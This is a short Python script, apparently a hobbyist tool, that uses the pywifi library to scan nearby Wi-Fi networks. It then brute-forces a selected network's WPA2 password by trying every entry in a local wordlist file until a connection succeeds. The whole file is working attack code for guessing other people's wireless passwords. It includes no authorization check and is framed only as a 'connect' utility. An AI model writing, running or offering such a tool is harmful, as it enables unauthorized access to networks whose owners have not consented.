from pywifi import const
import pywifi
import sys
from time import sleep
from os import system


# for printing help
def print_help(args):
    print("-i\tor\t--interfaces\t\t\t\t: To find your wireless network interface.\n")
    print("-s\tor\t--scan\t\t\t\t\t\t: To scan available wifi networks.\n")
    print("-c [wifi network name] or --connect : To connect wifi network you want.\n")
    print("Usage <command> :", args)


available_devices = []
final_password = ""

# initialize pywifi
init_pyfi = pywifi.PyWiFi()

# To get the first interface of our device
interfaces = init_pyfi.interfaces()[0]

# Scan wireless WI-FI devices of our device and print it.
interfaces.scan()

devices = interfaces.scan_results()

for all_dev in devices:
    available_devices.append(all_dev.ssid)


def connector(interface_ssid, wordlist) -> str:
    if interfaces.status() == const.IFACE_CONNECTED:
        print("Network already connected\n")
        sys.exit()

    else:
        network_profile = pywifi.Profile()
        network_profile.ssid = interface_ssid
        network_profile.key = wordlist
        network_profile.auth = const.AUTH_ALG_OPEN
        network_profile.cipher = const.CIPHER_TYPE_CCMP
        network_profile.akm.append(const.AKM_TYPE_WPA2PSK)

        interfaces.remove_all_network_profiles()
        tmp_profile = interfaces.add_network_profile(network_profile)

        interfaces.connect(tmp_profile)
        sleep(4)

        if interfaces.status() == const.IFACE_CONNECTED:
            print(f"Password found : {wordlist}")
            print("Network connected successfully\n")
            sys.exit()
        else:
            print(f"Password \'{wordlist}\' is incorrect in interface -> {interface_ssid}")


def bruteforce(interface):
    with open("list", "r") as file:

        for wordlst in file.readlines():
            wordlst = wordlst.strip()

            if connector(interface,wordlst):
                break


def main():
    if sys.argv[1] == "-i" or sys.argv[1] == "--interfaces":
        for all_devs in devices:
            print("Network name :{}".format(all_devs.ssid))
            print("Network bssid :{}".format(all_devs.bssid))
            print("Network akm :{}".format(all_devs.akm))
            print("Network cipher :{}".format(all_devs.cipher))

    elif sys.argv[1] == "-s" or sys.argv[1] == "--scan":
        print(str(available_devices))
    elif sys.argv[1] == "-c" and sys.argv[2] in available_devices or sys.argv[1] == "--connect" and sys.argv[2] in available_devices:
        bruteforce(sys.argv[2])
    elif sys.argv[1] == "-c" and not sys.argv[2] or sys.argv[1] == "--connect" and not sys.argv[2]:
        print_help(sys.argv[0])
        print("interface name not specified\n")
    else:
        print_help(sys.argv[0])
        print("Invalid command\n")


if __name__ == "__main__":
    main()



